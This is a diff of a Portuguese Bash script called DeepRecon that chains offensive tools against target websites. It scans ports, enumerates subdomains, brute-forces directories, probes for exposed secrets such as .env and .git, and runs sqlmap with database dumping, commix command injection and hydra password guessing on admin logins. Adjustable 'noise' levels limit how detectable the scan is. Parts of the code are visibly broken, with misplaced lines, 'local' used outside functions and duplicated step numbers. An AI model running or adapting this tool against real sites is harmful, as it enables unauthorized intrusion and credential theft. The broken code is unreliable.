+    printf "${CYAN}${BOLD}║${RESET}  Rodar? ${GREEN}[S]${RESET}/${RED}n${RESET}: "; read -r resp
+    if [[ "$resp" != "n" && "$resp" != "N" ]]; then
+      STEP_CHOICES+=("1"); CUMULATIVE_NOISE=$((CUMULATIVE_NOISE+rn))
+    else
+      STEP_CHOICES+=("0")
+    fi
+  done
+  clear
+  echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
+  echo -e "${CYAN}${BOLD}║      RESULTADO CUSTOM                           ║${RESET}"
+  echo -e "${CYAN}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
+  echo -e "${CYAN}${BOLD}║${RESET}  Ativos: ${GREEN}$(echo "${STEP_CHOICES[@]}"|tr -d ' '|grep -o '1'|wc -l)${RESET}"
+  echo -e "${CYAN}${BOLD}║${RESET}  Ruido: ${YELLOW}$CUMULATIVE_NOISE/$NOISE_TOTAL_MAX${RESET}"
+  np=$((CUMULATIVE_NOISE*100/(NOISE_TOTAL_MAX>0?NOISE_TOTAL_MAX:1)))
+  nf=$(printf "%$((np/2))s"|tr ' ' '#'); ne=$(printf "%$((50-np/2))s")
+  echo -e "${CYAN}${BOLD}║${RESET}  ${YELLOW}[${nf}${ne}]${RESET}  ${np}%"
+  echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
+  sleep 2; NOISE_MAX=7; CUSTOM_RUIDO=$CUMULATIVE_NOISE
+fi
+
+# configurar autenticacao
+echo -ne "${YELLOW}Configurar autenticacao para o scan? (s/N): ${RESET}"; read -r auth_q
+[[ "$auth_q" = "s" || "$auth_q" = "S" ]] && configurar_auth
+login_automatico
+
+# display noise bar
+if [ "$MODO" = "custom" ] && [ "$CUSTOM_RUIDO" -gt 0 ] 2>/dev/null; then
+  np=$((CUSTOM_RUIDO*100/(NOISE_TOTAL_MAX>0?NOISE_TOTAL_MAX:1)))
+  [ "$np" -le 30 ] && nc=$GREEN nl="BAIXO"; [ "$np" -gt 30 ] && [ "$np" -le 60 ] && nc=$YELLOW nl="MEDIO"
+  [ "$np" -gt 60 ] && nc=$RED nl="ALTO"
+  nf=$(printf "%$((np/2))s"|tr ' ' '#'); ne=$(printf "%$((50-np/2))s")
+  nd="${CUSTOM_RUIDO}/${NOISE_TOTAL_MAX} (${np}%)"
+else
+  np=$((NOISE_MAX*100/7))
+  [ "$NOISE_MAX" -le 3 ] && nc=$GREEN nl="BAIXO"; [ "$NOISE_MAX" -gt 3 ] && [ "$NOISE_MAX" -le 5 ] && nc=$YELLOW nl="MEDIO"
+  [ "$NOISE_MAX" -gt 5 ] && nc=$RED nl="ALTO"
+  nf=$(printf "%$((np/2))s"|tr ' ' '#'); ne=$(printf "%$((50-np/2))s")
+  nd="Max noise: $NOISE_MAX/7"
+fi
+
+echo ""
+echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
+echo -e "${CYAN}${BOLD}║           NIVEL DE BARULHO DO SCAN               ║${RESET}"
+echo -e "${CYAN}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
+echo -e "${CYAN}${BOLD}║${RESET}  Modo: ${BOLD}$(echo "$MODO"|tr 'a-z' 'A-Z')${RESET}  |  Ruido: ${nc}${BOLD}${nl}${RESET}  |  $nd | Delay: ${RATE_LIMIT_MS}ms"
+echo -e "${CYAN}${BOLD}║${RESET}  ${nc}[${nf}${ne}]${RESET}"
+echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
 echo ""
 echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
 echo -e "${CYAN}${BOLD}║              Alvos: ${#ALVOS[@]} site(s)                      ║${RESET}"
 echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
 for i in "${!ALVOS[@]}"; do
   echo -e "  ${BOLD}[$((i+1))]${RESET} ${ALVOS[$i]}"
+# ============================================================
+
+# ============================================================
+echo ""
+echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
+
 done
 echo ""
 sleep 3
@@ -259,13 +732,46 @@ PROTOCOLO=$(echo "$ALVO" | grep -q 'https' && echo "https" || echo "http")
 REPORT="/tmp/DeepRecon_${DOMINIO}_$(date +%Y%m%d_%H%M%S).txt"
 > "$REPORT"
 
-TOTAL_PASSOS=25
+TOTAL_PASSOS=35
+NOISE_ACUM=0
 PASSO_ATUAL=0
 
+# flags de tecnologia
+TEC_WP=0 TEC_JOOMLA=0 TEC_DRUPAL=0 TEC_IIS=0 TEC_APACHE=0 TEC_NGINX=0
+TEC_PHP=0 TEC_ASP=0 TEC_PYTHON=0 TEC_NODE=0 TEC_JAVA=0
+TEC_LOGIN=0 TEC_PARAM=0 TEC_FORM=0 TEC_UPLOAD=0 TEC_NOME=""
+
+# instala ferramenta sob demanda
+instalar_se_precisar() {
+  local cmd="$1" pkg="${2:-$1}"
+  command -v "$cmd" &>/dev/null && return 0
+  echo -e "  ${YELLOW}[!] $cmd nao encontrado. Instalando...${RESET}"
+  sudo apt-get install -y -qq "$pkg" 2>/dev/null && command -v "$cmd" &>/dev/null && echo -e "  ${GREEN}[+] $cmd instalado${RESET}" && return 0
+  pip3 install "$cmd" 2>/dev/null && command -v "$cmd" &>/dev/null && echo -e "  ${GREEN}[+] $cmd via pip3${RESET}" && return 0
+  echo -e "  ${RED}[!!] Falha ao instalar $cmd${RESET}"; return 1
+}
+
 progresso() {
-  PASSO_ATUAL=$((PASSO_ATUAL + 1))
-  PERCENT=$((PASSO_ATUAL * 100 / TOTAL_PASSOS))
-  echo -e "\n${CYAN}[${PERCENT}%] ${1}${RESET}"
+  local ruido="${2:-0}" nome="$1"
+  if [ "$MODO" = "custom" ]; then
+    local idx=$PASSO_ATUAL
+    [ "$idx" -lt "${#STEP_CHOICES[@]}" ] && [ "${STEP_CHOICES[$idx]}" = "0" ] && { PASSO_ATUAL=$((PASSO_ATUAL+1)); return 1; }
+  elif [ "$NOISE_MAX" -lt "$ruido" ]; then
+    PASSO_ATUAL=$((PASSO_ATUAL+1))
+    np=$((NOISE_ACUM*100/(NOISE_TOTAL_MAX>0?NOISE_TOTAL_MAX:1)))
+    echo -e "\n${YELLOW}[$((PASSO_ATUAL*100/TOTAL_PASSOS))%] [PULADO - $MODO] $nome${RESET}"
+    echo -e "  ${YELLOW}Ruido: [$(printf "%$((np/2))s"|tr ' ' '#')$(printf "%$((50-np/2))s")] ${np}%${RESET}"
+    return 1
+  fi
+  PASSO_ATUAL=$((PASSO_ATUAL+1))
+  NOISE_ACUM=$((NOISE_ACUM+ruido))
+  PERCENT=$((PASSO_ATUAL*100/TOTAL_PASSOS))
+  np=$((NOISE_ACUM*100/(NOISE_TOTAL_MAX>0?NOISE_TOTAL_MAX:1)))
+  nfill=$((np/2)); nempty=$((50-nfill))
+  bf=$(printf "%${nfill}s"|tr ' ' '#'); be=$(printf "%${nempty}s")
+  cn=$([ "$np" -le 30 ]&&echo "$GREEN"||[ "$np" -le 60 ]&&echo "$YELLOW"||echo "$RED")
+  echo -e "\n${CYAN}[${PERCENT}%] $nome${RESET}"
+  echo -e "  ${cn}Ruido: [${bf}${be}] ${np}%${RESET}"
 }
 
 info() {
@@ -287,6 +793,14 @@ echo ""
 echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
 echo -e "${MAGENTA}${BOLD}║        DEEPRECON v1.0 - Scanner Web              ║${RESET}"
 echo -e "${MAGENTA}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
+echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Conexao:${RESET}    $(verificar_conexao "$ALVO" && echo "${GREEN}OK${RESET}" || echo "${RED}FALHOU${RESET}")"
+echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Escopo:${RESET}      ${CYAN}*.$DOMINIO${RESET}"
+echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Jobs:${RESET}        ${CYAN}$MAX_JOBS paralelos${RESET}"
+echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Disco livre:${RESET}  ${CYAN}${FREE_DISK}MB${RESET}"
+if [ "$FREE_DISK" -lt 500 ]; then
+  echo -e "${MAGENTA}${BOLD}║${RESET}  ${YELLOW}AVISO: Disco baixo! Limpe arquivos temporarios.${RESET}"
+fi
+echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
 echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Alvo:${RESET}      ${CYAN}$ALVO${RESET}"
 echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}IP:${RESET}        ${CYAN}$(host "$DOMINIO" 2>/dev/null | awk '/has address/{print $NF; exit}')${RESET}"
 echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Data:${RESET}      $(date '+%d/%m/%Y %H:%M:%S')"
@@ -294,19 +808,35 @@ echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Relatorio:${RESET} ${CYAN}$REPORT$
 echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
 echo ""
 
+# === VALIDACAO DE CONEXAO ===
+if ! verificar_conexao "$ALVO"; then
+  aviso "Alvo inalcancavel - continuando com info limitada"
+fi
+# === ESCOPO ===
+SCOPE_DOMAIN="$DOMINIO"
+SCOPE_ALVOS=()
+
+# === DETECCAO DE NUVEM ===
+HEADERS_INICIAIS=$(curl_rapido -I "$ALVO" 2>/dev/null)
+IP_ALVO=$(host "$DOMINIO" 2>/dev/null | awk '/has address/{print $NF; exit}')
+detectar_nuvem "$IP_ALVO" "$HEADERS_INICIAIS"
+
+# === MODO SEGURO ===
+detectar_forms_agressivos "$ALVO"
+
 # ===== PASSO 1: WAF =====
-progresso "WAFW00F - Detectando firewall"
-if command -v wafw00f &>/dev/null; then
+progresso "WAFW00F - Detectando firewall" 2
+if valida_ferramenta "wafw00f"; then
   wafw00f "$ALVO" 2>/dev/null | while read -r line; do
     if echo "$line" | grep -qi "behind"; then
       critico "WAF detectado: $(echo "$line" | cut -d: -f2-)"
     fi
-  done
+  done || aviso "wafw00f falhou"
 fi
 
 # ===== PASSO 2: HEADERS =====
-progresso "Analisando headers de seguranca"
-HEADERS=$(curl -sI -L "$ALVO" 2>/dev/null)
+progresso "Analisando headers de seguranca" 2
+HEADERS=$(curl_rapido -I -L "$ALVO" 2>/dev/null)
 echo "$HEADERS" | head -25
 echo ""
 echo "$HEADERS" | grep -qi "strict-transport-security" || aviso "Falta HSTS"
@@ -317,57 +847,104 @@ echo "$HEADERS" | grep -qi "x-xss-protection" || aviso "Falta X-XSS-Protection"
 echo "$HEADERS" | grep -i "^set-cookie:" | grep -vi "secure" && aviso "Cookie sem flag Secure"
 
 # ===== PASSO 3: WHATWEB =====
-progresso "WhatWeb - Identificando tecnologias"
-if command -v whatweb &>/dev/null; then
-  whatweb -a 3 "$ALVO" 2>/dev/null
+progresso "WhatWeb - Identificando tecnologias" 2
+if valida_ferramenta "whatweb"; then
+  WHATWEB_OUT=$(whatweb -a 3 "$ALVO" 2>/dev/null)
+  echo "$WHATWEB_OUT"
+  echo "$WHATWEB_OUT" | grep -qi "WordPress" && TEC_WP=1 && TEC_NOME="${TEC_NOME} WordPress"
+  echo "$WHATWEB_OUT" | grep -qi "Joomla" && TEC_JOOMLA=1 && TEC_NOME="${TEC_NOME} Joomla"
+  echo "$WHATWEB_OUT" | grep -qi "Drupal" && TEC_DRUPAL=1 && TEC_NOME="${TEC_NOME} Drupal"
+  echo "$WHATWEB_OUT" | grep -qi "IIS" && TEC_IIS=1 && TEC_NOME="${TEC_NOME} IIS"
+  echo "$WHATWEB_OUT" | grep -qi "Apache" && TEC_APACHE=1 && TEC_NOME="${TEC_NOME} Apache"
+  echo "$WHATWEB_OUT" | grep -qi "nginx" && TEC_NGINX=1 && TEC_NOME="${TEC_NOME} Nginx"
+  echo "$WHATWEB_OUT" | grep -qi "PHP" && TEC_PHP=1 && TEC_NOME="${TEC_NOME} PHP"
+  echo "$WHATWEB_OUT" | grep -qi "ASP\.NET\|ASP" && TEC_ASP=1 && TEC_NOME="${TEC_NOME} ASP.NET"
+  echo "$WHATWEB_OUT" | grep -qi "Django\|Python" && TEC_PYTHON=1 && TEC_NOME="${TEC_NOME} Python"
+  echo "$WHATWEB_OUT" | grep -qi "Node\|Express" && TEC_NODE=1 && TEC_NOME="${TEC_NOME} Node.js"
+  echo "$WHATWEB_OUT" | grep -qi "Java\|Tomcat\|JBoss" && TEC_JAVA=1 && TEC_NOME="${TEC_NOME} Java"
+  echo "$WHATWEB_OUT" | grep -qi "login\|signin\|/admin\|/login\|/wp-login\|/user" && TEC_LOGIN=1
+  echo "$WHATWEB_OUT" | grep -qiE "param|query|find|search|id=" && TEC_PARAM=1
+  echo "$WHATWEB_OUT" | grep -qiE "form|input|submit|textarea" && TEC_FORM=1
+  echo "$WHATWEB_OUT" | grep -qiE "upload|file|attach" && TEC_UPLOAD=1
+  [ -n "$TEC_NOME" ] && info "Tecnologias detectadas: $TEC_NOME"
+  detectar_spa
 fi
 
 # ===== PASSO 4: SSL =====
-progresso "SSLScan - Verificando SSL/TLS"
-if [ "$PROTOCOLO" = "https" ] && command -v sslscan &>/dev/null; then
-  sslscan "$DOMINIO" 2>/dev/null | grep -iE "weak|error|heartbleed|poodle|rc4|cbc|tlsv1\.[01]" | head -15
-  if sslscan "$DOMINIO" 2>/dev/null | grep -qi "heartbleed"; then
-    critico "VULNERAVEL A HEARTBLEED!"
-  fi
-  echo | openssl s_client -connect "${DOMINIO}:443" -servername "$DOMINIO" 2>/dev/null | openssl x509 -noout -subject -dates 2>/dev/null
+progresso "SSLScan - Verificando SSL/TLS" 2
+if [ "$PROTOCOLO" = "https" ] && valida_ferramenta "sslscan"; then
+  SSL_OUT=$(sslscan "$DOMINIO" 2>/dev/null) || aviso "sslscan falhou"
+  echo "$SSL_OUT" | grep -iE "weak|error|heartbleed|poodle|rc4|cbc|tlsv1\.[01]" | head -15
+  echo "$SSL_OUT" | grep -qi "heartbleed" && critico "VULNERAVEL A HEARTBLEED!"
+  echo | openssl s_client -connect "${DOMINIO}:443" -servername "$DOMINIO" 2>/dev/null | openssl x509 -noout -subject -dates 2>/dev/null || true
 fi
 
 # ===== PASSO 5: SUBDOMINIOS =====
-progresso "Subfinder - Descobrindo subdominios"
-if command -v subfinder &>/dev/null; then
-  subfinder -d "$DOMINIO" -silent 2>/dev/null | head -20
+progresso "Subfinder - Descobrindo subdominios" 2
+if valida_ferramenta "subfinder"; then
+  while IFS= read -r sub; do
+    escopo_adicionar "$sub" && info "  Subdominio: $sub"
+  done < <(subfinder -d "$DOMINIO" -silent 2>/dev/null | head -30) || aviso "subfinder falhou"
 fi
-if command -v amass &>/dev/null; then
-  amass enum -d "$DOMINIO" -passive -timeout 30 2>/dev/null | head -20
+if valida_ferramenta "amass"; then
+  while IFS= read -r sub; do
+    escopo_adicionar "$sub" && info "  Subdominio amass: $sub"
+  done < <(amass enum -d "$DOMINIO" -passive -timeout 30 2>/dev/null | head -30) || aviso "amass falhou"
 fi
 
-# ===== PASSO 6: NMAP =====
-progresso "Nmap - Escaneando portas"
-if command -v nmap &>/dev/null; then
-  nmap --top-ports 100 -T4 --open -sV "$DOMINIO" 2>/dev/null | grep -E '^[0-9]|PORT|SERVICE|VERSION' | head -30
-  echo ""
-  nmap -sV --script=http-title,http-server-header,http-headers "$DOMINIO" 2>/dev/null | grep -E 'title|Server|Header' | head -10
-else
-  info "Nmap nao disponivel - usando bash TCP scan basico"
-  for port in 21 22 23 25 53 80 110 143 443 445 993 995 1433 1521 2049 3306 3389 5432 5900 5985 5986 6379 8080 8443 9090 27017; do
-    timeout 2 bash -c "echo > /dev/tcp/$DOMINIO/$port" 2>/dev/null && echo -e "${GREEN}[ABERTA]${RESET} Porta $port" && critico "PORTA ABERTA: $DOMINIO:$port"
+# ===== PASSO 6: ESCANEAR SUBDOMINIOS =====
+if [ ${#SCOPE_ALVOS[@]} -gt 0 ]; then
+  progresso "Escaneando subdominios descobertos" 1
+  for sub_alvo in "${SCOPE_ALVOS[@]}"; do
+    info "Scan rapido: $sub_alvo"
+    if valida_ferramenta "nmap"; then
+      nmap --top-ports 20 -T4 --open "$sub_alvo" 2>/dev/null | grep -E '^[0-9]' | head -5 || true
+    fi
   done
 fi
 
-# ===== PASSO 7: GOBUSTER =====
-progresso "Gobuster - Descobrindo diretorios"
-if command -v gobuster &>/dev/null; then
+# ===== PASSO 7: NMAP =====
+progresso "Nmap - Escaneando portas" 2
+PORTAS_ABERTAS=(); WEB_ATIVO=0
+if valida_ferramenta "nmap" && verificar_conexao "$ALVO"; then
+  local nmap_rate=$([ "$RATE_LIMIT_MS" -ge 500 ] && echo 50 || [ "$RATE_LIMIT_MS" -ge 200 ] && echo 200 || echo 500)
+  NMAP_RAW=$(nmap --top-ports 100 -T4 --max-retries 1 --min-rate "$nmap_rate" --open -sV "$DOMINIO" 2>/dev/null) || aviso "nmap scan de portas falhou"
+  echo "$NMAP_RAW" | grep -E '^[0-9]|PORT|SERVICE|VERSION' | head -30
+  echo ""
+  (nmap -sV --script=http-title,http-server-header,http-headers "$DOMINIO" 2>/dev/null || aviso "nmap scripts falhou") | grep -E 'title|Server|Header' | head -10
+  while IFS= read -r line; do
+    port=$(echo "$line" | cut -d/ -f1)
+    [ -n "$port" ] && PORTAS_ABERTAS+=("$port")
+  done < <(echo "$NMAP_RAW" | grep "^[0-9]/tcp" | grep -v "^|")
+else
+  info "Nmap nao disponivel - usando bash TCP scan basico"
+  for port in 21 22 23 25 53 80 110 143 443 445 993 995 1433 1521 2049 3306 3389 5432 5900 5985 5986 6379 8080 8443 9090 27017; do
+    timeout 2 bash -c "echo > /dev/tcp/$DOMINIO/$port" 2>/dev/null && {
+      PORTAS_ABERTAS+=("$port")
+      echo -e "${GREEN}[ABERTA]${RESET} Porta $port" && critico "PORTA ABERTA: $DOMINIO:$port"
+    }
+  done
+fi
+for pweb in 80 443 8080 8443; do
+  [[ " ${PORTAS_ABERTAS[*]} " =~ " $pweb " ]] && WEB_ATIVO=1
+done
+[ "$WEB_ATIVO" = "0" ] && aviso "Nenhuma porta web aberta - ferramentas web serao puladas"
+
+# ===== PASSO 8: GOBUSTER =====
+progresso "Gobuster - Descobrindo diretorios" 2
+if [ "$WEB_ATIVO" = "1" ] && valida_ferramenta "gobuster" && verificar_conexao "$ALVO"; then
   WORDLIST="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
   [ ! -f "$WORDLIST" ] && WORDLIST="/usr/share/wordlists/dirb/common.txt"
   if [ -f "$WORDLIST" ]; then
-    gobuster dir -u "$ALVO" -w "$WORDLIST" -t "$THREADS" -q -s 200,301,302,403,401 -x php,txt,html,bak,zip,tar,sql,json,xml 2>/dev/null | head -50
+    (gobuster dir -u "$ALVO" -w "$WORDLIST" -t "$TOOL_THREADS" -q -s 200,301,302,403,401 -x php,txt,html,bak,zip,tar,sql,json,xml 2>/dev/null || aviso "gobuster falhou") | head -50
   fi
 fi
 
-# ===== PASSO 8: ARQUIVOS SENSIVEIS =====
-progresso "Procurando arquivos sensiveis"
+# ===== PASSO 9: ARQUIVOS SENSIVEIS =====
+progresso "Procurando arquivos sensiveis" 2
+if [ "$WEB_ATIVO" = "1" ]; then
 for path in admin login backup wp-admin config .git .env .htaccess .svn phpinfo.php test.php info.php debug.php console painel dashboard painel administrativo xmlrpc.php wp-config.php.bak wp-config.php~ dump.sql database.sql server-status server-info crossdomain.xml; do
-  body_code=$(curl -s -L --max-time 3 -o /tmp/.deeprecon_body -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
+  body_code=$(curl_rapido -L --max-time 3 -o /tmp/.deeprecon_body -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
   body=$(cat /tmp/.deeprecon_body 2>/dev/null | head -c 500)
   if [ "$body_code" != "000" ]; then
     if [ "$body_code" = "200" ]; then
@@ -397,121 +974,116 @@ for path in admin login backup wp-admin config .git .env .htaccess .svn phpinfo.
   fi
 done
 rm -f /tmp/.deeprecon_body 2>/dev/null
+else
+  aviso "Pulando arquivos sensiveis (sem porta web)"
+fi
 
-# ===== PASSO 9: SQLMAP =====
-progresso "SQLMap - Testando SQL Injection"
-if command -v sqlmap &>/dev/null; then
-  PARAM=$(curl -s "$ALVO" 2>/dev/null | grep -oP '(?<=\?)[a-z]+(?==)' | head -1)
+# ===== PASSO 10: SQLMAP =====
+progresso "SQLMap - Testando SQL Injection" 2
+if [ "$WEB_ATIVO" = "1" ] && valida_ferramenta "sqlmap"; then
+  PARAM=$(curl_rapido "$ALVO" 2>/dev/null | grep -oP '(?<=\?)[a-z]+(?==)' | head -1)
   SQLI_ACHOU=0
   if [ -n "$PARAM" ]; then
     info "Parametro GET: $PARAM"
-    SQLI_RESULT=$(sqlmap -u "${ALVO}?${PARAM}=1" --batch --level=2 --risk=2 --time-sec=5 --dbs 2>/dev/null)
-    if echo "$SQLI_RESULT" | grep -qi "vulnerable"; then
-      critico "SQL INJECTION DETECTADA em ?$PARAM"
-      SQLI_ACHOU=1
-    fi
+    SQLI_RESULT=$(sqlmap -u "${ALVO}?${PARAM}=1" --batch --level=2 --risk=2 --threads=5 --time-sec=2 --dbs 2>/dev/null || aviso "sqlmap GET falhou")
+    echo "$SQLI_RESULT" | grep -qi "vulnerable" && critico "SQL INJECTION DETECTADA em ?$PARAM" && SQLI_ACHOU=1
   fi
-  if command -v sqlmap &>/dev/null; then
-    SQLI_FORMS=$(sqlmap -u "$ALVO" --crawl=1 --batch --forms --level=2 --risk=2 --time-sec=5 2>/dev/null)
-    if echo "$SQLI_FORMS" | grep -qi "vulnerable"; then
-      critico "SQL INJECTION DETECTADA em formulario!"
-      SQLI_ACHOU=1
-    fi
-  fi
-  # Testa SQL Injection em cookies e headers
-  COOKIE=$(curl -sI "$ALVO" 2>/dev/null | grep -i "^set-cookie:" | head -1 | sed 's/.*: //' | cut -d';' -f1)
+  SQLI_FORMS=$(sqlmap -u "$ALVO" --crawl=1 --batch --forms --level=2 --risk=2 --threads=5 --time-sec=2 2>/dev/null || aviso "sqlmap forms falhou")
+  echo "$SQLI_FORMS" | grep -qi "vulnerable" && critico "SQL INJECTION DETECTADA em formulario!" && SQLI_ACHOU=1
+  COOKIE=$(curl_rapido -I "$ALVO" 2>/dev/null | grep -i "^set-cookie:" | head -1 | sed 's/.*: //' | cut -d';' -f1)
   if [ -n "$COOKIE" ]; then
-    SQLI_COOKIE=$(sqlmap -u "$ALVO" --cookie="$COOKIE=1'" --batch --level=3 --risk=2 2>/dev/null)
-    if echo "$SQLI_COOKIE" | grep -qi "vulnerable"; then
-      critico "SQL INJECTION DETECTADA em cookie!"
-      SQLI_ACHOU=1
-    fi
+    SQLI_COOKIE=$(sqlmap -u "$ALVO" --cookie="$COOKIE=1'" --batch --level=3 --risk=2 2>/dev/null || aviso "sqlmap cookie falhou")
+    echo "$SQLI_COOKIE" | grep -qi "vulnerable" && critico "SQL INJECTION DETECTADA em cookie!" && SQLI_ACHOU=1
   fi
-  if [ "$SQLI_ACHOU" -eq 0 ]; then
-    info "Nenhuma SQL Injection encontrada nos testes basicos"
-  fi
+  [ "$SQLI_ACHOU" -eq 0 ] && info "Nenhuma SQL Injection encontrada nos testes basicos"
 fi
 
-# ===== PASSO 10: COMMIX =====
-progresso "Commix - Testando Command Injection"
-if command -v commix &>/dev/null; then
-  PARAM=$(curl -s "$ALVO" 2>/dev/null | grep -oP '(?<=\?)[a-z]+(?==)' | head -1)
+# ===== PASSO 11: COMMIX =====
+progresso "Commix - Testando Command Injection" 2
+if [ "$WEB_ATIVO" = "1" ] && valida_ferramenta "commix"; then
+  PARAM=$(curl_rapido "$ALVO" 2>/dev/null | grep -oP '(?<=\?)[a-z]+(?==)' | head -1)
   if [ -n "$PARAM" ]; then
-    commix --url="${ALVO}?${PARAM}=1" --batch --level=1 2>/dev/null | grep -iE "vulnerable|injection|Confidence|Payload" | head -10
+    commix --url="${ALVO}?${PARAM}=1" --batch --level=1 2>/dev/null | grep -iE "vulnerable|injection|Confidence|Payload" | head -10 || aviso "commix falhou"
   fi
 fi
 
-# ===== PASSO 11: FFUF =====
-progresso "FFUF - Forca bruta de diretorios"
-if command -v ffuf &>/dev/null; then
+# ===== PASSO 12: FFUF =====
+progresso "FFUF - Forca bruta de diretorios" 2
+if [ "$WEB_ATIVO" = "1" ] && valida_ferramenta "ffuf" && verificar_conexao "$ALVO"; then
   WL="/usr/share/wordlists/dirb/common.txt"
   if [ -f "$WL" ]; then
-    ffuf -u "$ALVO/FUZZ" -w "$WL" -t "$THREADS" -c -s -fc 404,403 2>/dev/null | head -40
+    (ffuf -u "$ALVO/FUZZ" -w "$WL" -t "$TOOL_THREADS" -c -s -fc 404,403 2>/dev/null || aviso "ffuf falhou") | head -40
   fi
 fi
 
-# ===== PASSO 12: WFUZZ =====
-progresso "WFuzz - Fuzzing de parametros"
-if command -v wfuzz &>/dev/null; then
-  PARAM=$(curl -s "$ALVO" 2>/dev/null | grep -oP '(?<=\?)[a-z]+(?==)' | head -1)
+# ===== PASSO 13: WFUZZ =====
+progresso "WFuzz - Fuzzing de parametros" 2
+if [ "$WEB_ATIVO" = "1" ] && [ "$MODO_SEGURO" != "1" ] && valida_ferramenta "wfuzz" && verificar_conexao "$ALVO"; then
+  PARAM=$(curl_rapido "$ALVO" 2>/dev/null | grep -oP '(?<=\?)[a-z]+(?==)' | head -1)
   if [ -n "$PARAM" ]; then
-    wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -u "${ALVO}?FUZZ=1" --hc 404 2>/dev/null | head -15
+    (wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -u "${ALVO}?FUZZ=1" --hc 404 2>/dev/null || aviso "wfuzz falhou") | head -15
   fi
+else
+  [ "$MODO_SEGURO" = "1" ] && info "WFuzz pulado pelo modo seguro"
 fi
 
-# ===== PASSO 13: NIKTO =====
-progresso "Nikto - Varredura de vulnerabilidades"
-if command -v nikto &>/dev/null; then
-  if [ "$PROTOCOLO" = "https" ]; then
-    nikto -h "$ALVO" -ssl -timeout 10 -no404 2>/dev/null | grep -iE "OSVDB|vulnerable|vuln|click|XSS|SQL|path|disclosure|error|backup|interesting|account|upload|exec|shell|injection" | head -30
-  else
-    nikto -h "$ALVO" -timeout 10 -no404 2>/dev/null | grep -iE "OSVDB|vulnerable|vuln|click|XSS|SQL|path|disclosure|error|backup|interesting|account|upload|exec|shell|injection" | head -30
-  fi
+# ===== PASSO 14: NIKTO =====
+progresso "Nikto - Varredura de vulnerabilidades" 2
+if [ "$WEB_ATIVO" = "1" ] && valida_ferramenta "nikto" && verificar_conexao "$ALVO"; then
+  local nikto_opts="-timeout 10 -no404"
+  [ "$MODO_SEGURO" = "1" ] && nikto_opts="$nikto_opts -nointeractive -nossl"
+  [ "$PROTOCOLO" = "https" ] && [ "$MODO_SEGURO" != "1" ] && nikto_opts="$nikto_opts -ssl"
+  nikto -h "$ALVO" $nikto_opts 2>/dev/null | grep -iE "OSVDB|vulnerable|vuln|click|XSS|SQL|path|disclosure|error|backup|interesting|account|upload|exec|shell|injection" | head -30 || aviso "nikto falhou"
+  [ "$MODO_SEGURO" = "1" ] && aviso "Nikto em modo seguro - sem teste SSL, sem interacao com forms"
 fi
 
-# ===== PASSO 14: WPSCAN =====
-progresso "WPScan - WordPress"
-if command -v wpscan &>/dev/null; then
-  wpscan --url "$ALVO" --no-update --api-token '' 2>/dev/null | grep -iE "WordPress|theme|plugin|vulnerability|identified|User|admin" | head -15
+# ===== PASSO 15: WPSCAN =====
+progresso "WPScan - WordPress" 2
+if [ "$WEB_ATIVO" = "1" ] && [ "$TEC_WP" = "1" ] && valida_ferramenta "wpscan"; then
+  local wpscan_token="${WPSCAN_API_TOKEN:-}"
+  wpscan --url "$ALVO" --no-update ${wpscan_token:+--api-token "$wpscan_token"} 2>/dev/null | grep -iE "WordPress|theme|plugin|vulnerability|identified|User|admin" | head -15 || aviso "wpscan falhou"
+elif [ "$TEC_WP" = "0" ]; then
+  info "WPScan pulado - WordPress nao detectado"
 fi
 
-# ===== PASSO 15: HYDRA =====
-progresso "Hydra - Testando senhas (admin)"
-if command -v hydra &>/dev/null; then
+# ===== PASSO 16: HYDRA =====
+progresso "Hydra - Testando senhas (admin)" 2
+if [ "$WEB_ATIVO" = "1" ] && valida_ferramenta "hydra"; then
   if echo "$ALVO" | grep -qE 'login|admin|painel'; then
-    hydra -l admin -P /usr/share/wordlists/fasttrack.txt "$DOMINIO" http-get / 2>/dev/null | head -10
+    hydra -t 4 -w 3 -l admin -P /usr/share/wordlists/fasttrack.txt "$DOMINIO" http-get / 2>/dev/null | head -10 || aviso "hydra falhou"
   fi
 fi
 
 # ===== PASSO 16: DNSRECON =====
-progresso "DNSRecon - Info DNS"
-if command -v dnsrecon &>/dev/null; then
-  dnsrecon -d "$DOMINIO" 2>/dev/null | grep -iE "A |AAAA|MX|NS|SOA|TXT" | head -15
+progresso "DNSRecon - Info DNS" 2
+if valida_ferramenta "dnsrecon"; then
+  dnsrecon -d "$DOMINIO" 2>/dev/null | grep -iE "A |AAAA|MX|NS|SOA|TXT" | head -15 || aviso "dnsrecon falhou"
 fi
 
 # ===== PASSO 17: WHOIS =====
-progresso "Whois - Info do dominio"
-if command -v whois &>/dev/null; then
-  whois "$DOMINIO" 2>/dev/null | grep -iE "Registrant|Creation|Expir|Name Server|Owner" | head -10
+progresso "Whois - Info do dominio" 2
+if valida_ferramenta "whois"; then
+  whois "$DOMINIO" 2>/dev/null | grep -iE "Registrant|Creation|Expir|Name Server|Owner" | head -10 || aviso "whois falhou"
 fi
 
